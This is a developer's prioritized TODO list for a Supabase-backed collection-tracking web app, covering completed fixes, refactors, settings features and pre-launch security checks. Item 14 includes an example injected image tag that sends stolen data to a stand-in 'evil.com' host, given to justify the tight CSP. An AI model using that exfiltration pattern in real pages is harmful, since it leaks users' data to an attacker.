# TODO

Short list of concrete next actions, prioritized. Cross items off as you finish them. For the full long-term backlog see [ideas.md](./ideas.md).

---

## 🔴 Top priority — do these next

### 1. ~~Verify schema applied in Supabase~~ ✅ Done 2026-05-14
Tables, policies, and `handle_new_user` trigger all confirmed in the Supabase dashboard.

### 2. ~~End-to-end smoke test~~ ✅ Done 2026-05-14
Sign-up + sign-in + adding items + persistence across sign-out all verified. Email confirmation disabled in Supabase to skip the localhost redirect issue. RLS bonus check (second user can't see first user's items) still untested — flag for any future session if you want to be paranoid.

### 3. ~~`npm audit fix`~~ ✅ Done 2026-05-14
Cleared all 4 vulnerabilities (postcss XSS, ws memory disclosure, 5 vite dev-server CVEs). Required a minor-version bump of vite from 6.3.5 → 6.4.2. Build verified clean afterward. `npm audit` now reports 0 vulnerabilities.

---

## 🟡 Worth a look soon

### A. ~~Refresh shouldn't flash through landing → sign-in → target~~ ✅ Done 2026-05-22
App.tsx now renders a neutral centered spinner while `auth.isLoading` is true (initial `supabase.auth.getSession()` in flight). Once the session resolves, the existing branches take over — straight to main if signed in, Landing if not. No more Landing → SignIn flash on refresh.

### F. ~~Default new-item status to the user's current view~~ ✅ Done 2026-05-22
`defaultStatusForActiveSection()` in `ItemFormDialog` preselects status
(Watched / Want to See) from the active sub-section; custom-section
checkbox preselect was already wired. Dialog description now reads
"Adding to: <Category> › <Section>" so the user can see and override
the preselect intentionally. Verification checklist in
[testing.md](./testing.md#-add-item--auto-default-to-active-view-todo-f).

### G. ~~Choose sub-category when accepting a recommendation~~ ✅ Done 2026-05-22
`useRecommendations.accept` now takes an `AcceptOptions` (`{ status, sections }`); RecommendationsTab renders an inline picker per pending row (status radio + section dropdown filtered to the item's content type). Defaults stay at `'want-to-see'` + no section so one-click accept still works.

### I. ~~Audit per-category fields/columns end-to-end~~ ✅ Done 2026-05-22
Verified every field-surface against `isMediaContentType` / `getContentTypeFieldConfig`:
- **ItemFormDialog** — already gated Genre, Studio, Seasons, Episodes behind `isMovieOrTvShow`. Platform label relabels per type. No change needed.
- **ItemDetailDialog** — was rendering Studio + Genre blocks whenever the values existed, regardless of content type. Now both gated behind `isMediaContentType(item.type)` so legacy non-media data doesn't leak into the UI. Platform heading already relabelled per type.
- **ItemCard** (grid view) — doesn't render those fields at all. Clean.
- **QuickEditDialog** — fixed in the same pass as the ListView (popup title / label / placeholder for platform now resolve per content type).
- **TmdbSearchableInput** — already gated on `isMediaContentType`, never shows for non-media.
- **CSV import/export** — intentionally left writing all standard columns regardless of type; a CSV file can mix types and per-row scoping happens at display, not transport. Empty cells for absent fields is standard.

### K. ~~Modularity refactor pass~~ ✅ K1–K5 done 2026-05-22 / K6 deferred
Audit findings + recommended order in commit history (search for "Modularity refactor K1–K3" and "K4 + K5").

- ~~K1. useToggle hook~~ ✅ — `src/hooks/useToggle.ts`, adopted in PasswordInput, SidebarLayout, RecommendButton, DicePicker.
- ~~K2. Extract decorateRecommendation~~ ✅ — `src/recommendations/decorate.ts` (pure helpers).
- ~~K3. Extract loadProfile from useAuth~~ ✅ — `src/auth/loadProfile.ts` (useAuth: 418 → 368 lines).
- ~~K4. Split FriendsDialog tabs~~ ✅ — `src/friends/{FriendsTab,RequestsTab,FindTab,LoadingRow}.tsx` (FriendsDialog: 382 → 130 lines).
- ~~K5. Extract ListView column definitions~~ ✅ — `src/components/item/{listViewColumns,SortHeader}.tsx` (ListView: 361 → 167 lines).
- **K6. Split ItemFormDialog — DEFERRED.** The form (365 lines, doing add/edit + TMDB autofill + custom-section preselect + status preselect) works today. Splitting it carries regression risk for no functional gain right now. Pick this up naturally when we tackle todo J (Add Category broken) since that requires touching form internals anyway.

Explicitly NOT doing:
- Flex / Row primitive component for repeated `flex items-center justify-between` strings — Tailwind class repetition is fine; abstracting it costs more than it saves.

### J. Add Category button is broken
Clicking "Add Category" in the sidebar should let the user create a
new top-level category (a custom tab) but it currently doesn't work
end-to-end. Investigate: confirm the dialog opens, the addCustomTab
flow saves to Supabase via useCustomTabs, and the new tab appears in
the sidebar. Likely a wiring bug or an RLS gap on custom_tabs.

Connected: there's no way today for the user to pick which columns/
fields their new custom category supports. Movies/TV/Restaurants/
Places each have a fixed schema baked into `contentHelpers.ts`
(getContentTypeFieldConfig + isMediaContentType). Two paths:
- (a) Custom categories inherit a sensible default field set (title,
  year, posterUrl, notes, status, favourite) and don't expose
  media-only fields like platform/genre.
- (b) Add a column picker to the Add Category dialog so the user
  toggles which fields show in the list view + form. Bigger UI; needs
  a custom_tabs.fields jsonb column.
Decide between (a)/(b) when we tackle this.

**Interim:** the user wants the Add Category button HIDDEN in the
sidebar until J is fixed, so they don't trip over the broken flow.
Re-show it as part of fixing J. (One-line change — comment out / gate
the `onAddTabDialogOpen` button in `Sidebar.tsx`.)

### L. ~~Add a built-in Gaming category~~ ✅ Done 2026-06-06
Content type id `'game'` shipped across the helpers and chrome:
- `isMediaContentType` now includes `'game'` (games share Genre / Studio / Platform with Movies / TV).
- New helper `isTmdbSearchableContentType` returns true ONLY for `'item'` + `'tv-show'` so TMDB lookup stays scoped to Movies / TV. TmdbSearchableInput uses the new helper.
- `getContentTypeFieldConfig`: `'game'` → displayLabel "Game", imageUrlLabel "Cover URL", platformFieldLabel "Platform" with placeholder "PS5, Xbox, Steam, Switch, etc.".
- `getWatchedLabel` / `getWantToSeeLabel`: "Played" / "Want to Play" for games.
- `getContentTypeName` and `getCategoryDisplayName`: "Games" / "game" / "games".
- `useCollectionStats` exposes `gameCount`; threaded through App → SidebarLayout → Sidebar + MobileBottomNav.
- Sidebar + MobileBottomNav `builtInCategories` arrays gain a Gamepad2 Gaming entry.
- `getSectionDisplayName` now delegates to the shared Watched / WantToSee label helpers so games render correctly there too.

### P. Refactor contentHelpers.ts to a per-type registry
Adding the Gaming category (todo L) required touching ~6 separate
if/else chains in `src/utils/contentHelpers.ts` — one per concern
(displayLabel, watchedLabel, platformFieldLabel, etc.). It works but
isn't compartmentalised: adding the next content type means another
6-place tour through the file.

Refactor into a single per-type config registry:
```ts
const CONTENT_TYPE_CONFIGS = {
  item:       { displayLabel: 'Movie', plural: 'movies', singular: 'movie', watched: 'Watched', wantToSee: 'Want to See', platformLabel: 'Where to Watch', platformPlaceholder: '...', imageUrlLabel: 'Poster URL', usesTmdb: true, hasGenreStudio: true },
  'tv-show':  { ... },
  restaurant: { ... },
  place:      { ... },
  game:       { ... },
};
```
Helpers (`isMediaContentType`, `getWatchedLabel`,
`getContentTypeFieldConfig`, `getContentTypeName`, etc.) become thin
lookups into that object. Adding the 6th content type then means
adding ONE block.

Keep the existing exported helper signatures so call sites don't have
to change. Smoke-test every content type after the migration.

### M. ~~Per-user toggle: show/hide categories in Settings~~ ✅ Done 2026-06-06
- Storage: `visibleCategories: Record<string, boolean>` sibling key in `preferences.background_colors` JSONB (no schema change), defaults all-true. Shallow merge on load preserves saved entries when new categories are added later.
- New shared module `src/utils/builtInCategories.ts` (`BUILT_IN_CATEGORIES` array with `id` / `label` / `shortLabel` / `icon`) replaces the duplicated inline arrays in Sidebar + MobileBottomNav.
- Sidebar + MobileBottomNav filter the shared list by the visibility map (missing entries treated as visible).
- SettingsDialog → Appearance tab gains a "Visible Categories" section with one Checkbox per built-in category.
- App.tsx auto-falls-back to the first visible category if the user hides the one they're currently viewing.
- Bonus fix: restored the missing `<TabsList>` in SettingsDialog so the Appearance tab is actually reachable (it had been hidden — only Account ever rendered).
- usePreferences now exports `BackgroundColorsState` so SettingsDialog uses the same typed shape rather than redeclaring a narrower one.

### Q. Settings: let users change their username
Settings → Account currently has Display Name and Email + Password
sections, but not Username. Users should be able to rename themselves
in the same place — the username is what shows up as `@handle` in
the sidebar, search, recommendation rows, etc.

Implementation:
- Add a "Username" field next to Display Name in `SettingsDialog`.
- On save, run the existing `validateUsername` from `src/auth/username.ts`
  (length / character / reserved-word checks). If valid, call
  `auth.handleUpdateProfile({ username })`.
- `useAuth.handleUpdateProfile` currently accepts `{ name?, listVisibility? }`
  — extend to `{ name?, listVisibility?, username? }`. On username
  changes also update the matching `auth.users` raw_user_meta_data if
  any code reads it (probably not — usernames live in `profiles`).
- DB check: the `profiles.username` column has a `unique` constraint
  (or should). When a duplicate is attempted, surface a friendly
  "Username already taken" toast via `handleSupabaseError`'s duplicate-
  regex check.
- Username-only auth accounts (synthetic email pattern) shouldn't lose
  their ability to sign in — sign-in resolution uses the synthetic
  email derived from the username at signup, so renaming the username
  WOULD break the sign-in path unless we also update the synthetic
  email. Decide: either disallow username changes for those accounts,
  or update both the profile + the auth.users email atomically (the
  latter requires `supabase.auth.updateUser({ email })` which sends a
  confirmation step — defeats the point). Probably disallow with a
  friendly explanation in the UI.

### O. Enter key in Add Item dialog closes without adding
Pressing Enter inside the Add Item dialog (after removing the
TmdbSearchableInput Enter override) closes the dialog but no item is
added. Don't know yet whether handleSubmit is even firing, whether
title is empty at submit time, or whether addItem's duplicate check is
silently bailing. Diagnostics to run next session:
- Open dialog, type a definitely-unique title (e.g. "zzz-test-123"),
  press Enter, watch for any toast.
- If a toast appears, paste its text — likely "Duplicate item" or
  "Failed to add item".
- If no toast and no add, add a temporary console.log at the top of
  `useItemForm.handleSubmit` to confirm it's firing AND what `title`
  evaluates to at that moment.
Likely fixes (pick after diagnosis):
- Make `handleSubmit` `async` and `await onAdd?.(…)` before calling
  `onSubmitted()` so a Supabase failure or the duplicate-check toast
  is surfaced while the dialog is still open.
- Have `addItem` return a boolean (success / not) so the caller can
  decide whether to close.
Probably trivial once diagnosed; deferring because we're not sure
which of those two is the actual cause yet.

### N. Faster / mobile-friendly notes editing
Today editing the Notes cell opens the QuickEditDialog which is good
on desktop but awkward on mobile (small textarea, full dialog, two
clicks to save). Make it quicker:
- **Long-press on an item row (mobile)** — open the notes editor
  directly, bypassing the item detail dialog. Touch-and-hold for ~500ms
  on the row should trigger it; use `pointerdown` / `pointerup` timing
  rather than native `contextmenu` (which Safari iOS doesn't always
  fire reliably for long-press).
- On desktop: a hybrid — maybe an inline-expand notes row instead of
  a modal, or auto-save on blur with a small "Saved" pulse so the
  user doesn't have to click Save.
- Consider adding a small "edit" pencil icon next to the notes row in
  the detail dialog too, so the user can edit notes directly from the
  item detail without navigating to the table cell.
- Also worth: increase the textarea size on mobile so the notes are
  comfortable to type on a phone keyboard.

### E. Upload / change user profile picture
Right now the sidebar + ProfileDialog avatars both render the generic
User icon on the accent-color gradient — there's no way for a user to
upload their own. Build out:
- A file input in ProfileDialog (Settings → Profile section) that lets
  the user pick a local image (PNG / JPG, ≤ ~2 MB; show inline error
  for oversized or wrong-type files).
- Upload to a new Supabase Storage bucket (e.g. `avatars/`) using
  `supabase.storage.from('avatars').upload(...)` keyed by user id.
  Public-read RLS or signed URL — whichever fits.
- Persist the resulting public URL onto `profiles.profile_image` (column
  already in the User type as `profileImage`; add it to the schema if
  not already present).
- Render `AvatarImage` from that URL in BOTH the sidebar avatar button
  and the ProfileDialog `<Avatar>` — fall back to the current User-icon
  +accent-gradient when no image is set.
- "Remove photo" button to revert to the default.
- Image-source guardrails: extend `index.html` CSP `img-src` to include
  the Supabase storage hostname (`*.supabase.co`).
- Demo users: keep this disabled / use a fixed mock image, per the
  isolate-demo rule.

### D. ~~Wire up the Tailwind v4 Vite plugin (re-enable JIT)~~ ✅ Done 2026-05-22
Installed `@tailwindcss/vite` + `tailwindcss@^4.3.0`, added the plugin
to `vite.config.ts`, and rewrote `src/styles/index.css` (3,725 → 323
lines) with `@import "tailwindcss"`, a `@custom-variant dark` declaration
matching shadcn's `.dark`-class convention, an `@theme inline` block
mapping the `--background` / `--foreground` / etc. CSS vars to the
Tailwind v4 colour namespace, and the existing `:root` / `.dark` token
blocks (including slate/cyan dark-mode remaps).

Existing custom rules (`.friend-tab-trigger`, `.friend-input`,
`.sidebar-fluid` + family, `.fluid-heading`, `.fluid-action-btn`,
`.dark-surface-dialog`) kept as-is — they could be inlined as Tailwind
variants now that the JIT works, but that's an optional separate cleanup.

Future utilities used in JSX (e.g. `text-white!`, `placeholder:text-white/50`,
`lg:hidden`) now generate CSS automatically — no more silent failures.

### H. (Maybe later) Per-subcategory icons + user-pickable colors
Sidebar subcategories (All, Watched, Want to See, Favorites, custom)
are currently text-only with thin dividers between them. To make them
more visually distinct without changing layout:
- Built-in subcategories each get a fixed icon (Grid for All, Eye for
  Watched/Visited, Bookmark for Want to See, Star for Favorites).
- Custom subcategories get either a default folder icon, OR an icon
  picker in the Add Subcategory dialog (same pattern Add Category
  already uses for top-level tabs).
- Optional further-out: let users pick a colour swatch per subcategory
  so each row carries its own accent tint. Would need a new color
  field on `custom_sections` in Supabase + matching UI in the Add
  Subcategory dialog.
- Apply icons/colors consistently in the main page chips/filters too,
  not just the sidebar.

Deferred per user — wanted dividers first; full customisation is
"nice to have, not important" for now.

### C. ~~Hover-over highlight pass for bars & links~~ ✅ Done 2026-05-22
Single hover language now lives in `src/utils/hoverStyles.ts` exporting two constants:
- `NAV_HOVER_CLASS = "hover:bg-white/10 transition-colors"` for nav items / menu rows / dialog rows (sidebar categories, sub-section items, "Add Category" / "Add Subcategory" buttons all use it).
- `ROW_HOVER_CLASS = "hover:bg-white/5 transition-colors"` for denser table-row layouts (ListView).

Replaced the previous mix (`hover:brightness-125`, `hover:bg-slate-700/50`, inline `hover:bg-white/5`) with these two constants. Future tweaks (intensity, transition speed, adding an accent left-border, etc.) happen in one file.

### B. ~~Clean up orphan profile rows + prevent future leftovers~~ ✅ Done 2026-05-22
Shipped via [supabase/cleanup_orphan_profiles.sql](../supabase/cleanup_orphan_profiles.sql) — deletes orphan profiles and re-adds `profiles_id_fkey` with `on delete cascade`. The schema.sql declaration already had cascade, but `create table if not exists` is a no-op on existing tables so the live constraint was missing it. Auth user deletes from Supabase Auth now propagate to the profile row automatically.

(Optional follow-up — not done yet: audit cascade behaviour on `collection_items.user_id`, `custom_tabs.user_id`, `custom_sections.user_id`, `preferences.user_id` the same way. Schema declarations have cascade; live constraints might not, depending on when each table was first created.)

### 3. ~~Check FormatGuideDialog's Pro Tip box in light mode~~ ✅ Done 2026-05-14
Visually verified — `bg-accent` reads as distinct from the surrounding dialog in light mode.

### 4. Decide on dark-mode polish (or skip)
Two items in [ideas.md](./ideas.md) under "Architecture":
- Wrapping content sections in `<Card>` for proper theming
- Full theme-token sweep across MainContent/ListView/etc.

Both are bigger UI changes. Only worth doing if you want dark mode to be a flagship visual feature. Otherwise the current state (dark sidebar + dark page bg in both modes) is fine.

---

## 🟢 Nice to have (no rush)

### 5. ~~In-app change password~~ ✅ Done 2026-05-14
Password section in Settings → Account: new-password + confirm-password fields with a Save button. Save enables only when the new password is ≥ 6 chars AND matches the confirm input. Mismatch / too-short surface as inline errors before hitting Supabase. Section hidden for demo users (no Supabase Auth row to update). Hooks into the existing `auth.handleChangePassword` that was added during #10.

### 6. ~~Dice picker — random suggestion from a category~~ ✅ Done 2026-05-14
Implemented as planned, isolated under `src/picker/` (matches `src/demo/`, `src/tmdb/`, `src/auth/`). Dice icon button sits next to the "+ Add" button on desktop; clicking pops a modal with a random item, re-roll button excludes the just-shown one so it actually changes. Empty pool disables the icon entirely; single-item pool disables re-roll. Picks from whatever the user is currently viewing (`itemsInActiveSection`) — so they can scope by navigating to Want to See / Watched / All before rolling. Mobile addition is a follow-up.

### 7. Mobile view completion
Earlier commit said "working on mobile view" — components exist in `src/components/mobile/` but weren't finished. Tackle when you have mobile users or before publishing.

### 6. ~~Toast/banner on Supabase failures~~ ✅ Done 2026-05-14
`usePreferences.ts` upsert + load and `useAuth.ts` profile load now toast on real failures instead of silently `console.error`-ing. PGRST116 (no rows) is still treated as expected (new users with no preferences row, or sign-up trigger hasn't fired yet) and falls through to defaults silently.

### 7. Add tests for `utils/csv.ts`
The CSV utility is a perfect first test target — pure functions, clear inputs/outputs. Whenever you regress a CSV import this is the obvious thing to set up.

### 8. ~~Account settings: change display name~~ ✅ Done 2026-05-14
"Display name" field in Settings → Account. Save button enables when dirty, calls `auth.handleUpdateProfile({ name })`, toast on success/failure. Demo updates in-memory (mockUsers), Supabase users hit `profiles.name`.

### 9. ~~Account settings: change email~~ ✅ Done 2026-05-14
"Email" section in Settings → Account shows the current email and a "Change email" input + Save button. Calls `supabase.auth.updateUser({ email })`, which sends a confirmation link to the new address — the change only takes effect after the user clicks it. Section is hidden entirely for username-only accounts (their `currentUser.email` is empty after `loadProfile` strips out synthetic addresses). Client-side validation rejects malformed emails and any attempt to switch to a `*@no-email.mycollection.local` synthetic address.

### 10. ~~Account settings: reset password~~ ✅ Done 2026-05-14
"Forgot password?" link on the Sign In page → user enters their email → `supabase.auth.resetPasswordForEmail()` sends a reset link to that address. Clicking the link fires Supabase's `PASSWORD_RECOVERY` event, which `useAuth` listens for and flips a `showPasswordResetPage` flag. App.tsx mounts the new `ResetPasswordPage` on top of everything else until the user enters a new password (`updateUser({ password })`).

Username-only accounts are explicitly blocked at the reset request — toast says "no email to send a reset link to."

Not yet built: in-app "change password" for logged-in users (no email roundtrip). Different flow; defer.

### 11. Pre-launch Supabase settings audit (do this before going live)
Walk through Supabase dashboard → **Authentication** and confirm each setting matches the intended production behavior. Today most of these are at default or set for dev convenience.

- **Sign In / Providers → Email → Confirm email** — currently **OFF** (we turned it off during smoke testing because localhost redirects don't work on phones). For production, turn **ON** so users can't sign up with fake email addresses.
- **Sign In / Providers → Email → Secure email change** — default **ON**. Verify it's still on. Sends confirmation to BOTH old and new address when changing email (anti-takeover).
- **URL Configuration → Site URL** — currently `localhost:5173`. Set to the deployed Vercel URL before launch. This is what confirmation/password-reset links redirect to.
- **URL Configuration → Redirect URLs** — whitelist any allowed redirect destinations (Vercel preview deployments, custom domains, etc.).
- **Rate Limits** — default per-IP limits. Increase if you expect more traffic; tighten if you want to be more conservative against signup spam.
- **Email Templates** — customize the templated emails (signup confirmation, email change, password reset) to match your branding. Currently using Supabase's plain defaults.
- **SMTP Settings** — currently using Supabase's built-in SMTP (≈30 emails/hour rate limit). For real volume, plug in SendGrid / Postmark / Resend.
- **Allow new users to sign up** — verify it's ON (it is by default; would only turn off if you wanted to lock signups).
- **Database → Tables → Policies** — re-verify the RLS policies one more time before launch.

### 12. ~~Test the forgot-password / reset-password flow end-to-end~~ ✅ Done 2026-05-22
Verified twice on the live deploy after each Supabase Site URL swap (localhost → `mycollection-nine.vercel.app` → `sidflicks.com` once the custom domain landed). Full flow worked end-to-end: Forgot password → email → click link → ResetPasswordPage → new password → sign in with new password.

### 13. Pre-deploy readiness checklist (do before going live on Vercel)
Bundle of things to confirm before flipping the switch:
- [Vercel] project connected to the repo; `main` branch deploys to production
- [Vercel] env vars set: `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY` (and `VITE_TMDB_TOKEN` if using TMDB search)
- [Supabase] complete the audit in **#11** (Confirm email ON, Site URL = production URL, etc.)
- [Supabase] add the production Vercel URL to **URL Configuration → Redirect URLs**
- [App] `index.html` CSP `connect-src` already covers `*.supabase.co`; no change needed unless using a custom Supabase domain
- [App] `index.html` CSP `img-src` — confirm all expected poster sources are whitelisted (see #14)
- Smoke-test the full flow on the deployed URL from a phone / second device (not just localhost):
  - Sign up with email → confirm via email link → land back in the app
  - Add an item → verify it persists
  - Change email → confirm via email link
  - Forgot password → reset via email link
- Database backup strategy: enable Supabase **Database → Backups** (paid tier) OR document a manual `pg_dump` schedule
- Confirm `npm audit` is still clean before the build

### 14. Expand the CSP `img-src` whitelist when adding new poster sources
`index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.

---

## 🌱 New feature ideas (longer-term)

Detailed write-ups for all three are in [ideas.md](./ideas.md) under "Features":

- **Username-only signup** (no email required) — synthetic-email auth pattern. Schema sketch + recovery-code tradeoffs already documented. Mid-effort (a few hours), single-session feasible.
- **Friend system (view-only list sharing)** — friend requests, view friends' lists read-only. Multi-day feature.
- **Shared / collaborative lists** — multiple users editing the same list together. Depends on the friend system being built first. Multi-day feature.

All three require Supabase schema additions. Don't start without a clear plan — open ideas.md before kicking off.

---

_Last touched: 2026-05-14 (post smoke-test)_
